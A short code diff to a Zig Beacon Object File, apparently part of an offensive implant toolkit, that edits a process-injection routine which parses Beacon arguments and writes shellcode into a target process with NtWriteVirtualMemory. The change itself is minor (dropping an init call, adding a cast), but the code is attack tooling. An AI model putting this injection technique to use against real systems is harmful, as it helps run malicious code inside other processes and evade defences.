@@ -4,8 +4,6 @@ const w32 = @import("bof_api").win32;
 const shared = @import("wInjectionChainShared.zig");
 
 pub export fn go(adata: ?[*]u8, alen: i32) callconv(.c) u8 {
-    @import("bof_api").init(adata, alen, .{});
-
     var parser = beacon.datap{};
     beacon.dataParse(&parser, adata, alen);
 
@@ -19,7 +17,7 @@ pub export fn go(adata: ?[*]u8, alen: i32) callconv(.c) u8 {
     state.nt_status = w32.NtWriteVirtualMemory(
         state.process_handle,
         base_address,
-        state.shellcode,
+        @constCast(state.shellcode),
         state.shellcode_len,
         &bytes_written,
     );
